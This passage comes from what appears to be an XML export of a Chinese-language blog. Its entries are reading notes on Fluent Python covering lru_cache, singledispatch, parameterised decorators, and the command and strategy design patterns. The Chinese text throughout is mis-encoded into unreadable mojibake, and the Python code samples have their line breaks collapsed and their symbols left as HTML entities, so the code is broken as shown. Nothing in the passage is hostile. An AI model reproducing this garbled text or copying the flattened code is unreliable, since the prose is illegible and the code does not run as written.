fibonacci(n): if n &lt; 2: return n return fibonacci(n-2) + fibonacci(n-1)if __name__=='__main__': print(fibonacci(6)) è¾“å‡ºå¦‚ä¸‹ï¼š -&gt; % python3 fibo_demo.py[0.00000075s] fibonacci(0) -&gt; 0[0.00000106s] fibonacci(1) -&gt; 1[0.00008829s] fibonacci(2) -&gt; 1[0.00000052s] fibonacci(1) -&gt; 1[0.00000056s] fibonacci(0) -&gt; 0[0.00000068s] fibonacci(1) -&gt; 1[0.00002681s] fibonacci(2) -&gt; 1[0.00005140s] fibonacci(3) -&gt; 2[0.00016751s] fibonacci(4) -&gt; 3[0.00000051s] fibonacci(1) -&gt; 1[0.00000046s] fibonacci(0) -&gt; 0[0.00000054s] fibonacci(1) -&gt; 1[0.00002430s] fibonacci(2) -&gt; 1[0.00005003s] fibonacci(3) -&gt; 2[0.00000054s] fibonacci(0) -&gt; 0[0.00000057s] fibonacci(1) -&gt; 1[0.00002484s] fibonacci(2) -&gt; 1[0.00000044s] fibonacci(1) -&gt; 1[0.00000081s] fibonacci(0) -&gt; 0[0.00000073s] fibonacci(1) -&gt; 1[0.00002765s] fibonacci(2) -&gt; 1[0.00005353s] fibonacci(3) -&gt; 2[0.00010212s] fibonacci(4) -&gt; 3[0.00017658s] fibonacci(5) -&gt; 5[0.00037021s] fibonacci(6) -&gt; 8 8 å¯ä»¥çœ‹åˆ°ä½é˜¶çš„éƒ¨åˆ†ä¸æ–­çš„è¢«è¿ç®—ï¼Œéå¸¸æµªè´¹æ—¶é—´ï¼Œä¸‹é¢æ˜¯åˆ©ç”¨ç¼“å­˜ä¼˜åŒ–åçš„ä»£ç : 12345678910import functoolsfrom clockdeco import clock@functools.lru_cache()@clockdef fibonacci(n): if n &lt; 2: return n return fibonacci(n-2) + fibonacci(n-1)if __name__=='__main__': print(fibonacci(6)) æ§åˆ¶å°è¾“å‡º: -&gt; % python3 fibo_demo.py[0.00000114s] fibonacci(0) -&gt; 0[0.00000152s] fibonacci(1) -&gt; 1[0.00014005s] fibonacci(2) -&gt; 1[0.00000173s] fibonacci(3) -&gt; 2[0.00018128s] fibonacci(4) -&gt; 3[0.00000119s] fibonacci(5) -&gt; 5[0.00022029s] fibonacci(6) -&gt; 8 8 è¿™é‡Œè¦æ³¨æ„çš„ä¸¤ç‚¹æ˜¯:lru_cacheå¿…é¡»å‘å¸¸è§„å‡½æ•°ä¸€æ ·è¢«è°ƒç”¨ï¼Œè€Œæ˜¯è£…é¥°å™¨æ˜¯å¯ä»¥å åŠ çš„ã€‚ä¸Šé¢çš„ä¾‹å­å‘Šè¯‰æˆ‘ä»¬lru_cacheåœ¨ä¼˜åŒ–é€’å½’ç¼“å­˜æ–¹é¢çš„å·¨å¤§ç”¨é€”ï¼Œå…¶å®å®ƒåœ¨Webåº”ç”¨ä¸­ä¹Ÿèƒ½èµ·åˆ°å¾ˆå¤§çš„ç”¨å¤„ functools.lru_cache(maxsize=128, typed=False) ä¸Šé¢å¯ä»¥çœ‹å‡ºfunctools.lru_cacheæ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼Œmaxsizeå’Œtypedã€‚ maxsizeæŒ‡å®šå­˜å‚¨ç»“æœçš„æ•°é‡ï¼Œç¼“å­˜æ»¡äº†ä¹‹åï¼Œæ—§çš„ç»“æœä¼šè¢«ä¸¢æ‰ï¼Œä¸€èˆ¬ä¸ºäº†æ€§èƒ½è€ƒè™‘ï¼Œè¿™ä¸ªå€¼è®¾ä¸º2çš„å¹‚ã€‚ typedæ˜¯å¦åŒºåˆ†ä¸åŒç±»å‹çš„ç»“æœï¼ˆå¦‚æµ®ç‚¹æ•°å’Œæ•´æ•°ï¼‰ åŒæ—¶lru_cacheè¦æ±‚è¢«ä¼ å…¥çš„å‡½æ•°çš„å‚æ•°æ˜¯å¯æ•£åˆ—çš„ã€‚ 7.8.2 å•åˆ†æ´¾æ³›å‡½æ•° Pythonä¸­ç»å¸¸ä¼šå›°æ‰°æˆ‘ä»¬çš„é—®é¢˜æ˜¯:æ²¡æœ‰switchè¯­å¥ï¼Œå¦‚ä½•å¤„ç†å¤šæ¡ä»¶çš„é—®é¢˜ã€‚ç”¨å¤šä¸ªif/elif/elseç»„åˆå¯ä»¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œä½†æœ‰æ—¶å€™è¿™æ ·åšçš„ä»£ç è¿‡äºå†—æ‚éš¾ä»¥é˜…è¯»ã€‚ single_dispatchè£…é¥°å™¨å°±æ˜¯è¢«ç”¨æ¥å¤„ç†è¿™ç§é—®é¢˜çš„ã€‚ä½¿ç”¨ @singledispatch è£…é¥°çš„æ™®é€šå‡½æ•°ä¼šå˜æˆæ³›å‡½æ•°ï¼ˆgeneric functionï¼‰ï¼šæ ¹æ®ç¬¬ä¸€ä¸ªå‚æ•°çš„ç±»å‹ï¼Œä»¥ä¸åŒæ–¹å¼æ‰§è¡Œç›¸åŒæ“ä½œçš„ä¸€ç»„å‡½æ•°ã€‚ ä¸‹é¢çš„ä¾‹å­å±•ç¤ºäº†ä¸€ä¸ªæ ¹æ®å‚æ•°ç±»å‹ä¸åŒç”Ÿæˆä¸åŒçš„Htmlçš„åœºæ™¯ 1234567891011121314151617181920from functools import singledispatchfrom collections import abcimport numbersimport html@singledispatchdef htmlize(obj): content = html.escape(repr(obj)) return '&lt;pre&gt;&#123;&#125;&lt;/pre&gt;'.format(content)@htmlize.register(str)def _(text): content = html.escape(text).replace('\n', '&lt;br&gt;\n') return '&lt;p&gt;&#123;0&#125;&lt;/p&gt;'.format(content)@htmlize.register(numbers.Integral)def _(n): return '&lt;pre&gt;&#123;0&#125; (0x&#123;0:x&#125;)&lt;/pre&gt;'.format(n)@htmlize.register(tuple)@htmlize.register(abc.MutableSequence)def _(seq): inner = '&lt;/li&gt;\n&lt;li&gt;'.join(htmlize(item) for item in seq) return '&lt;ul&gt;\n&lt;li&gt;' + inner + '&lt;/li&gt;\n&lt;/ul&gt;' æ³¨å†Œçš„ä¸“é—¨å‡½æ•°åº”è¯¥å°½å¯èƒ½å¤„ç†æŠ½è±¡åŸºç±»ï¼ˆå¦‚ numbers.Integral å’Œabc.MutableSequenceï¼‰ï¼Œä¸è¦å¤„ç†å…·ä½“å®ç°ï¼ˆå¦‚ int å’Œ listï¼‰ã€‚è¿™æ ·ï¼Œä»£ç æ”¯æŒçš„å…¼å®¹ç±»å‹æ›´å¹¿æ³›ã€‚ä¾‹å¦‚ï¼ŒPython æ‰©å±•å¯ä»¥å­ç±»åŒ– numbers.Integralï¼Œä½¿ç”¨å›ºå®šçš„ä½æ•°å®ç° int ç±»å‹ã€‚ single dispatch ç±»ä¼¼é‡è½½ï¼Œä½†ç»ä¸æ˜¯ä¸ºäº†æŠŠ Java çš„é‚£ç§æ–¹æ³•é‡è½½å¸¦å…¥ Pythonã€‚ 7.9 å‚æ•°åŒ–è£…é¥°å™¨Python æŠŠè¢«è£…é¥°çš„å‡½æ•°ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ä¼ ç»™è£…é¥°å™¨å‡½æ•°ã€‚é‚£æ€ä¹ˆè®©è£…é¥°å™¨æ¥å—å…¶ä»–å‚æ•°å‘¢ï¼Ÿç­”æ¡ˆæ˜¯ï¼šåˆ›å»ºä¸€ä¸ªè£…é¥°å™¨å·¥å‚å‡½æ•°ï¼ŒæŠŠå‚æ•°ä¼ ç»™å®ƒï¼Œè¿”å›ä¸€ä¸ªè£…é¥°å™¨ï¼Œç„¶åå†æŠŠå®ƒåº”ç”¨åˆ°è¦è£…é¥°çš„å‡½æ•°ä¸Šã€‚ ä¸‹é¢ä¾æ¬¡è®²è§£ä¸Šæ–‡ä¸­å‡ºç°è¿‡çš„è£…é¥°å™¨çš„å‚æ•°åŒ–: å‚æ•°åŒ–çš„registerationä¸ºäº†ä¾¿äºå¯ç”¨æˆ–ç¦ç”¨ register æ‰§è¡Œçš„å‡½æ•°æ³¨å†ŒåŠŸèƒ½ï¼Œæˆ‘ä»¬ä¸ºå®ƒæä¾›ä¸€ä¸ªå¯é€‰çš„ activeå‚æ•°ï¼Œè®¾ä¸º False æ—¶ï¼Œä¸æ³¨å†Œè¢«è£…é¥°çš„å‡½æ•°ã€‚123456789101112131415161718registry = set()def register(active=True): def decorate(func): print('running register(active=%s)-&gt;decorate(%s)'% (active, func)) if active: registry.add(func) else: registry.discard(func) return func return decorate@register(active=False)def f1(): print('running f1()')@register()def f2(): print('running f2()')def f3(): print('running f3()') è¿™é‡Œçš„å…³é”®æ˜¯ï¼Œregister() è¦è¿”å› decorateï¼Œç„¶åæŠŠå®ƒåº”ç”¨åˆ°è¢«è£…é¥°çš„å‡½æ•°ä¸Šã€‚è¿™åªæ˜¯ä¸€ä¸ªæœ€ç®€å•çš„ä¾‹å­ï¼Œå‚æ•°åŒ–è£…é¥°å™¨é€šå¸¸ä¼šæŠŠè¢«è£…é¥°çš„å‡½æ•°æ›¿æ¢æ‰ï¼Œè€Œä¸”ç»“æ„ä¸Šéœ€è¦å¤šä¸€å±‚åµŒå¥—ã€‚æ¥ä¸‹æ¥ä¼šæ¢è®¨è¿™ç§å‡½æ•°é‡‘å­—å¡”ã€‚ å‚æ•°åŒ–clockè£…é¥°å™¨æˆ‘ä»¬éœ€è¦å¯¹clockè£…é¥°å™¨æ·»åŠ ä¸€ä¸ªåŠŸèƒ½ï¼šè®©ç”¨æˆ·ä¼ å…¥ä¸€ä¸ªæ ¼å¼å­—ç¬¦ä¸²ï¼Œæ§åˆ¶è¢«è£…é¥°å‡½æ•°çš„è¾“å‡ºã€‚ 123456789101112131415161718192021import timeDEFAULT_FMT = '[&#123;elapsed:0.8f&#125;s] &#123;name&#125;(&#123;args&#125;) -&gt; &#123;result&#125;'def clock(fmt=DEFAULT_FMT): #å‚æ•°åŒ–çš„è£…é¥°å™¨å·¥å‚å‡½æ•° def decorate(func): #çœŸæ­£çš„è£…é¥°å™¨ def clocked(*_args):#åŒ…è£…å‡½æ•°çš„å‡½æ•° t0 = time.time() _result = func(*_args) elapsed = time.time() - t0 name = func.__name__ args = ', '.join(repr(arg) for arg in _args) result = repr(_result) print(fmt.format(**locals())) return _result return clocked return decorate if __name__ == '__main__': @clock() def snooze(seconds): time.sleep(seconds) for i in range(3): snooze(.123) å°ç»“è¿™ç« å¼€å§‹å·²ç»è¿›å…¥å…ƒç¼–ç¨‹é¢†åŸŸäº†ã€‚å‚æ•°åŒ–è£…é¥°å™¨åŸºæœ¬ä¸Šéƒ½æ¶‰åŠè‡³å°‘ä¸¤å±‚åµŒå¥—å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨ @functools.wraps ç”Ÿæˆè£…é¥°å™¨ï¼Œä¸ºé«˜çº§æŠ€æœ¯æä¾›æ›´å¥½çš„æ”¯æŒï¼ŒåµŒå¥—å±‚çº§å¯èƒ½è¿˜ä¼šæ›´æ·±ï¼Œæ¯”å¦‚å‰é¢ç®€è¦ä»‹ç»è¿‡çš„å æ”¾è£…é¥°å™¨ã€‚è‹¥æƒ³çœŸæ­£ç†è§£è£…é¥°å™¨ï¼Œéœ€è¦åŒºåˆ†å¯¼å…¥æ—¶å’Œè¿è¡Œæ—¶ï¼Œè¿˜è¦çŸ¥é“å˜é‡ä½œç”¨åŸŸã€é—­åŒ…å’Œæ–°å¢çš„nonlocal å£°æ˜ã€‚æŒæ¡é—­åŒ…å’Œ nonlocal ä¸ä»…å¯¹æ„å»ºè£…é¥°å™¨æœ‰å¸®åŠ©ï¼Œè¿˜èƒ½ååŠ©ä½ åœ¨æ„å»ºGUI ç¨‹åºæ—¶é¢å‘äº‹ä»¶ç¼–ç¨‹ï¼Œæˆ–è€…ä½¿ç”¨å›è°ƒå¤„ç†å¼‚æ­¥ I/Oã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>decorator</tag>
        <tag>closure</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Pythonç¬¬å…­ç« :ä½¿ç”¨ä¸€ç­‰å‡½æ•°å®ç°è®¾è®¡æ¨¡å¼(2) â€”â€” å‘½ä»¤æ¨¡å¼]]></title>
    <url>%2F2017%2F12%2F19%2Ffluent-python-6-2%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬å…­ç« è¯»ä¹¦æŠ¥å‘Š-ç¬¬äºŒéƒ¨åˆ† Chapter 6. Design Patterns with First-Class Functionsç¬¬å…­ç« . ä½¿ç”¨ä¸€ç­‰å‡½æ•°å®ç°è®¾è®¡æ¨¡å¼(2) â€”â€” å‘½ä»¤æ¨¡å¼è¿™ä¸€ç« ä¸­ä¼šè®²åˆ°è®¾è®¡æ¨¡å¼çš„å®šä¹‰å’Œé€‚ç”¨åœºæ™¯ï¼Œä»¥åŠåˆ©ç”¨Pythonçš„ä¸€ç­‰å‡½æ•°ç‰¹æ€§å¯¹è®¾è®¡æ¨¡å¼çš„å®ç°ã€‚ è¿™ç¯‡åšæ–‡ä¸­è®¨è®ºå‘½ä»¤æ¨¡å¼ã€‚ å‘½ä»¤æ¨¡å¼ ä¸Šé¢çš„UMLç±»å›¾æ‰€æè¿°çš„åœºæ™¯æ˜¯â€èœå•é©±åŠ¨çš„æ–‡æœ¬ç¼–è¾‘å™¨â€,ä½¿ç”¨å‘½ä»¤æ¨¡å¼å®ç°ã€‚å„ä¸ªå‘½ä»¤å¯ä»¥æœ‰ä¸åŒçš„æ¥æ”¶è€…ï¼ˆå®ç°æ“ä½œçš„å¯¹è±¡ï¼‰ã€‚å¯¹ PasteCommand æ¥è¯´ï¼Œæ¥æ”¶è€…æ˜¯Documentã€‚å¯¹ OpenCommand æ¥è¯´ï¼Œæ¥æ”¶è€…æ˜¯åº”ç”¨ç¨‹åºã€‚ å‘½ä»¤æ¨¡å¼çš„ç›®çš„æ˜¯è§£è€¦è°ƒç”¨æ“ä½œçš„å¯¹è±¡ï¼ˆè°ƒç”¨è€…ï¼‰å’Œæä¾›å®ç°çš„å¯¹è±¡ï¼ˆæ¥æ”¶è€…ï¼‰ã€‚åœ¨ä¸Šé¢æ‰€ä¸¾çš„ç¤ºä¾‹ä¸­ï¼Œè°ƒç”¨è€…æ˜¯å›¾å½¢åº”ç”¨ç¨‹åºä¸­çš„èœå•é¡¹ï¼Œè€Œæ¥æ”¶è€…æ˜¯è¢«ç¼–è¾‘çš„æ–‡æ¡£æˆ–åº”ç”¨ç¨‹åºè‡ªèº«ã€‚ è¿™ä¸ªæ¨¡å¼çš„åšæ³•æ˜¯ï¼Œåœ¨äºŒè€…ä¹‹é—´æ”¾ä¸€ä¸ª Command å¯¹è±¡ï¼Œè®©å®ƒå®ç°åªæœ‰ä¸€ä¸ªæ–¹æ³•ï¼ˆexecuteï¼‰çš„æ¥å£ï¼Œè°ƒç”¨æ¥æ”¶è€…ä¸­çš„æ–¹æ³•æ‰§è¡Œæ‰€éœ€çš„æ“ä½œã€‚è¿™æ ·ï¼Œè°ƒç”¨è€…æ— éœ€äº†è§£æ¥æ”¶è€…çš„æ¥å£ï¼Œè€Œä¸”ä¸åŒçš„æ¥æ”¶è€…å¯ä»¥é€‚åº”ä¸åŒçš„ Command å­ç±»ã€‚è°ƒç”¨è€…æœ‰ä¸€ä¸ªå…·ä½“çš„å‘½ä»¤ï¼Œé€šè¿‡è°ƒç”¨ execute æ–¹æ³•æ‰§è¡Œã€‚æ³¨æ„ï¼ŒUMLå›¾ä¸­çš„ MacroCommand å¯èƒ½ä¿å­˜ä¸€ç³»åˆ—å‘½ä»¤ï¼Œå®ƒçš„ execute() æ–¹æ³•ä¼šåœ¨å„ä¸ªå‘½ä»¤ä¸Šè°ƒç”¨ç›¸åŒçš„æ–¹æ³•ã€‚ å¦‚ä½•åˆ©ç”¨Pythonçš„ä¸€ç­‰å¯¹è±¡æ€§è´¨å¯¹è¿™ä¸ªè®¾è®¡æ¨¡å¼è¿›è¡Œä¼˜åŒ–å‘¢ï¼Ÿä¹‹å‰è®²åˆ°ç­–ç•¥æ¨¡å¼æ—¶æˆ‘ä»¬æåˆ°è¿‡: ä½¿ç”¨å‡½æ•°ä»£æ›¿æ²¡æœ‰çŠ¶æ€çš„ç±»çš„å¯¹è±¡ è¿™æ ·æˆ‘ä»¬å¯ä»¥ä¸ä¸ºè°ƒç”¨è€…æä¾›Commandå¯¹è±¡ï¼Œè€Œæ˜¯æä¾›ä¸€ä¸ªå‡½æ•°commandã€‚è°ƒç”¨è€…ä¸ç”¨è°ƒç”¨command.excute(),ä½¿ç”¨command()å°±è¡Œã€‚è€ŒMacroCommandå¯ä»¥å®ç°æˆå¯è°ƒç”¨çš„å¯¹è±¡(å®ç°__call__æ–¹æ³•)ï¼Œç»´æŠ¤ä¸€ä¸ªå‡½æ•°åˆ—è¡¨ä¾›ä»¥åè°ƒç”¨ã€‚ 1234567class MacroCommand: """ä¸€ä¸ªæ‰§è¡Œä¸€ç»„å‘½ä»¤çš„å‘½ä»¤""" def __init__(self, commands): self.commands = list(commands) def __call__(self): for command in self.commands: command() å¦‚æœéœ€è¦æ”¯æŒæ’¤é”€æ“ä½œ(å‘½ä»¤æ¨¡å¼çš„å®šä¹‰ä¸­è¦æ±‚æ”¯æŒ), ä¸Šé¢çš„ä»£ç å¯èƒ½è¿œè¿œä¸å¤Ÿï¼Œè¿™æ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨Pythonæä¾›çš„ä¸€äº›æ›¿ä»£å“: ä¸ºä¸Šé¢çš„å¯è°ƒç”¨ç¤ºä¾‹æ·»åŠ å±æ€§æ¥ä¿å­˜çŠ¶æ€ ä½¿ç”¨å‡½æ•°é—­åŒ…åœ¨è°ƒç”¨ä¹‹é—´ä¿å­˜å‡½æ•°çš„å†…éƒ¨çŠ¶æ€ è¿™é‡Œé‡‡ç”¨çš„æ–¹å¼ä¸â€œç­–ç•¥â€æ¨¡å¼æ‰€ç”¨çš„ç±»ä¼¼ï¼šæŠŠå®ç°å•æ–¹æ³•æ¥å£çš„ç±»çš„å®ä¾‹æ›¿æ¢æˆå¯è°ƒç”¨å¯¹è±¡ã€‚æ¯•ç«Ÿï¼Œæ¯ä¸ªPython å¯è°ƒç”¨å¯¹è±¡éƒ½å®ç°äº†å•æ–¹æ³•æ¥å£ï¼Œè¿™ä¸ªæ–¹æ³•å°±æ˜¯ callã€‚ æ€»ç»“é€šè¿‡å¯¹ç­–ç•¥æ¨¡å¼å’Œå‘½ä»¤æ¨¡å¼çš„å®ç°ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†Pythonçš„ä¸€ç­‰å¯¹è±¡ç‰¹æ€§çš„ä½¿ç”¨æ–¹å¼: è®¾è®¡æ¨¡å¼æˆ–API è¦æ±‚ç»„ä»¶å®ç°å•æ–¹æ³•æ¥å£ï¼Œè€Œé‚£ä¸ªæ–¹æ³•çš„åç§°å¾ˆå®½æ³›ï¼Œä¾‹å¦‚â€œexecuteâ€â€œrunâ€æˆ–â€œdoItâ€ã€‚åœ¨ Python ä¸­ï¼Œè¿™äº›æ¨¡å¼æˆ– API é€šå¸¸å¯ä»¥ä½¿ç”¨ä¸€ç­‰å‡½æ•°æˆ–å…¶ä»–å¯è°ƒç”¨çš„å¯¹è±¡å®ç°ï¼Œä»è€Œå‡å°‘æ ·æ¿(é‡å¤çš„)ä»£ç ã€‚ å…³äºPythonè¯­è¨€çš„è®¾è®¡æ¨¡å¼è¯»ç‰©åœ¨é˜…è¯»æœ¬ç« ä¹‹å‰ï¼Œæˆ‘ä¹Ÿå»æ‰¾è¿‡è®¾è®¡æ¨¡å¼ç›¸å…³ä¹¦ç±ï¼ŒåŸºæœ¬éƒ½æ˜¯ä½¿ç”¨Java/C#å®ç°çš„ï¼ŒPythonç›¸å…³çš„è®¾è®¡æ¨¡å¼ä¹¦ç±ç¡®å®ä¹å–„å¯é™ˆã€‚Fluent-Pythonæ¨èçš„è®¾è®¡æ¨¡å¼è¯»ç‰©: ã€ŠPython Cookbookï¼ˆç¬¬ 3 ç‰ˆï¼‰ä¸­æ–‡ç‰ˆã€‹ï¼ˆDavid Beazley å’Œ Brian K. Jones è‘—ï¼‰çš„â€œ8.21 å®ç°è®¿é—®è€…æ¨¡å¼â€ä½¿ç”¨ä¼˜é›…çš„æ–¹å¼å®ç°äº†â€œè®¿é—®è€…â€æ¨¡å¼ï¼Œå…¶ä¸­çš„ NodeVisitor ç±»æŠŠæ–¹æ³•å½“ä½œä¸€ç­‰å¯¹è±¡å¤„ç†ã€‚ Learning Python Design Patternsï¼ˆGennadiy Zlobin è‘—ï¼ŒPackt å‡ºç‰ˆç¤¾ï¼‰ ã€ŠPython é«˜çº§ç¼–ç¨‹ã€‹ï¼ˆTarek ZiadÃ©è‘—ï¼‰æ˜¯å¸‚é¢ä¸Šæœ€å¥½çš„ Python ä¸­çº§ä¹¦ï¼Œç¬¬ 14 ç« â€œæœ‰ç”¨çš„è®¾è®¡æ¨¡å¼â€ä» Python ç¨‹åºå‘˜çš„è§†è§’ä»‹ç»äº† 7 ç§ç»å…¸æ¨¡å¼ã€‚ Failed Project: Python 3 Patterns,Recipes and Idioms(Last updated 2015-08-04) ã€ŠHead First è®¾è®¡æ¨¡å¼ã€‹(è¿™æœ¬æˆ‘ä¹°äº†ã€‚ã€‚ã€‚ã€‚å›´ç»•Javaè®²çš„) ã€ŠRuby è®¾è®¡æ¨¡å¼ã€‹ï¼ˆRuss Olsen è‘—ï¼‰ä¸€ä¹¦æœ‰å¾ˆå¤šè§è§£ä¹Ÿé€‚ç”¨äº Pythonã€‚ ã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹ä¸€ä¹¦æ˜¯å¿…è¯»çš„ã€‚å…‰æ˜¯â€œå¼•è¨€â€å°±å€¼å›ä¹¦é’±äº†(ä¹¦é‡Œè¿™ä¹ˆå†™çš„)]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>design pattern</tag>
        <tag>The Command pattern</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Pythonç¬¬å…­ç« :ä½¿ç”¨ä¸€ç­‰å‡½æ•°å®ç°è®¾è®¡æ¨¡å¼(1) â€”â€” ç­–ç•¥æ¨¡å¼]]></title>
    <url>%2F2017%2F12%2F17%2Ffluent-python-6-1%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬å…­ç« è¯»ä¹¦æŠ¥å‘Š-ç¬¬ä¸€éƒ¨åˆ† Chapter 6. Design Patterns with First-Class Functionsç¬¬å…­ç« . ä½¿ç”¨ä¸€ç­‰å‡½æ•°å®ç°è®¾è®¡æ¨¡å¼(1) â€”â€” ç­–ç•¥æ¨¡å¼è¿™ä¸€ç« ä¸­ä¼šè®²åˆ°è®¾è®¡æ¨¡å¼çš„å®šä¹‰å’Œé€‚ç”¨åœºæ™¯ï¼Œä»¥åŠåˆ©ç”¨Pythonçš„ä¸€ç­‰å‡½æ•°ç‰¹æ€§å¯¹è®¾è®¡æ¨¡å¼çš„å®ç°ã€‚ è¿™ç¯‡åšæ–‡ä¸­å…ˆè®¨è®ºç­–ç•¥æ¨¡å¼ã€‚ ç­–ç•¥æ¨¡å¼åˆç†åˆ©ç”¨ä½œä¸ºä¸€ç­‰å‡½æ•°çš„å¯¹è±¡å¯ä»¥ç®€åŒ–æŸäº›è®¾è®¡æ¨¡å¼ã€‚ ç»å…¸çš„ç­–ç•¥æ¨¡å¼ã€Šè®¾è®¡æ¨¡å¼ï¼šå¯å¤ç”¨é¢å‘å¯¹è±¡è½¯ä»¶çš„åŸºç¡€ã€‹ä¸€ä¹¦æ˜¯è¿™æ ·æ¦‚è¿°â€œç­–ç•¥â€æ¨¡å¼çš„ï¼š å®šä¹‰ä¸€ç³»åˆ—ç®—æ³•ï¼ŒæŠŠå®ƒä»¬ä¸€ä¸€å°è£…èµ·æ¥ï¼Œå¹¶ä¸”ä½¿å®ƒä»¬å¯ä»¥ç›¸äº’æ›¿æ¢ã€‚æœ¬æ¨¡å¼ä½¿å¾—ç®—æ³•å¯ä»¥ç‹¬ç«‹äºä½¿ç”¨å®ƒçš„å®¢æˆ·è€Œå˜åŒ–ã€‚ ç­–ç•¥æ¨¡å¼çš„ä¸€ä¸ªç»å…¸çš„åœºæ™¯æ˜¯å•†åº—çš„æŠ˜æ‰£ç­–ç•¥ï¼Œä¸Šå›¾æ˜¯è¿™ä¸ªåœºæ™¯çš„UMLç±»å›¾ã€‚å…·ä½“åœºæ™¯å¦‚ä¸‹: å‡å¦‚ä¸€ä¸ªç½‘åº—åˆ¶å®šäº†ä¸‹è¿°æŠ˜æ‰£è§„åˆ™: æœ‰ 1000 æˆ–ä»¥ä¸Šç§¯åˆ†çš„é¡¾å®¢ï¼Œæ¯ä¸ªè®¢å•äº« 5% æŠ˜æ‰£ã€‚ åŒä¸€è®¢å•ä¸­ï¼Œå•ä¸ªå•†å“çš„æ•°é‡è¾¾åˆ° 20 ä¸ªæˆ–ä»¥ä¸Šï¼Œäº« 10% æŠ˜æ‰£ã€‚ è®¢å•ä¸­çš„ä¸åŒå•†å“è¾¾åˆ° 10 ä¸ªæˆ–ä»¥ä¸Šï¼Œäº« 7% æŠ˜æ‰£ã€‚ç®€å•èµ·è§ï¼Œæˆ‘ä»¬å‡å®šä¸€ä¸ªè®¢å•ä¸€æ¬¡åªèƒ½äº«ç”¨ä¸€ä¸ªæŠ˜æ‰£ã€‚ ä¸Šé¢çš„UMLå›¾ä¸­: ä¸Šä¸‹æ–‡: æŠŠä¸€äº›è®¡ç®—å§”æ‰˜ç»™å®ç°ä¸åŒç®—æ³•çš„å¯äº’æ¢ç»„ä»¶ï¼Œæä¾›æœåŠ¡ã€‚åœ¨è¿™ä¸ªç”µå•†ç¤ºä¾‹ä¸­ï¼Œä¸Šä¸‹æ–‡æ˜¯ Orderï¼Œå®ƒä¼šæ ¹æ®ä¸åŒçš„ç®—æ³•è®¡ç®—ä¿ƒé”€æŠ˜æ‰£ã€‚ ç­–ç•¥:å®ç°ä¸åŒç®—æ³•çš„ç»„ä»¶å…±åŒçš„æ¥å£ã€‚åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œåä¸º Promotion çš„æŠ½è±¡ç±»æ‰®æ¼”è¿™ä¸ªè§’è‰²ã€‚ å…·ä½“ç­–ç•¥: â€œç­–ç•¥â€çš„å­ç±»ï¼ŒfidelityPromoã€BulkPromo å’ŒLargeOrderPromo æ˜¯è¿™é‡Œå®ç°çš„ä¸‰ä¸ªå…·ä½“ç­–ç•¥ã€‚ ä¸Šé¢çš„UMLç±»å›¾ä¸­ï¼Œæ¯ä¸ªå…·ä½“ç­–ç•¥éƒ½æ˜¯ä¸€ä¸ªç±»ï¼Œè€Œä¸”éƒ½åªå®šä¹‰äº†ä¸€ä¸ªæ–¹æ³•ï¼Œå³ discountã€‚æ­¤å¤–ï¼Œç­–ç•¥å®ä¾‹æ²¡æœ‰çŠ¶æ€ï¼ˆæ²¡æœ‰å®ä¾‹å±æ€§ï¼‰ã€‚ä¸‹é¢æ˜¯ä½¿ç”¨Pythonå¯¹è¿™ä¸ªç­–ç•¥çš„é‡æ„ï¼ŒåŒ…æ‹¬æŠŠå…·ä½“ç­–ç•¥ç”¨å‡½æ•°å®ç°(è€Œä¸æ˜¯ç±»)ï¼Œå–æ¶ˆäº†PromotionæŠ½è±¡ç±»ã€‚ç¤ºä¾‹6.1 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#coding=utf8from abc import ABC, abstractmethodfrom collections import namedtupleCustomer = namedtuple('Customer', 'name fidelity')class LineItem: def __init__(self, product, quantity, price): self.product = product self.quantity = quantity self.price = price def total(self): return self.price * self.quantityclass Order: # ä¸Šä¸‹æ–‡ def __init__(self, customer, cart, promotion=None): self.customer = customer self.cart = list(cart) self.promotion = promotion def total(self): if not hasattr(self, '__total'): self.__total = sum(item.total() for item in self.cart) return self.__total def due(self): if self.promotion is None: discount = 0 else: discount = self.promotion.discount(self) return self.total() - discount def __repr__(self): fmt = '&lt;Order total: &#123;:.2f&#125; due: &#123;:.2f&#125;&gt;' return fmt.format(self.total(), self.due())class Promotion(ABC) : # ç­–ç•¥ï¼šæŠ½è±¡åŸºç±» @abstractmethod def discount(self, order): """è¿”å›æŠ˜æ‰£é‡‘é¢ï¼ˆæ­£å€¼ï¼‰""" class FidelityPromo(Promotion): # ç¬¬ä¸€ä¸ªå…·ä½“ç­–ç•¥ """ä¸ºç§¯åˆ†ä¸º1000æˆ–ä»¥ä¸Šçš„é¡¾å®¢æä¾›5%æŠ˜æ‰£""" def discount(self, order): return order.total() * .05 if order.customer.fidelity &gt;= 1000 else 0class BulkItemPromo(Promotion): # ç¬¬äºŒä¸ªå…·ä½“ç­–ç•¥ """å•ä¸ªå•†å“ä¸º20ä¸ªæˆ–ä»¥ä¸Šæ—¶æä¾›10%æŠ˜æ‰£""" def discount(self, order): discount = 0 for item in order.cart: if item.quantity &gt;= 20: discount += item.total() * .1 return discountclass LargeOrderPromo(Promotion): # ç¬¬ä¸‰ä¸ªå…·ä½“ç­–ç•¥ """è®¢å•ä¸­çš„ä¸åŒå•†å“è¾¾åˆ°10ä¸ªæˆ–ä»¥ä¸Šæ—¶æä¾›7%æŠ˜æ‰£""" def discount(self, order): distinct_items = &#123;item.product for item in order.cart&#125; if len(distinct_items) &gt;= 10: return order.total() * .07 return 0 åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ 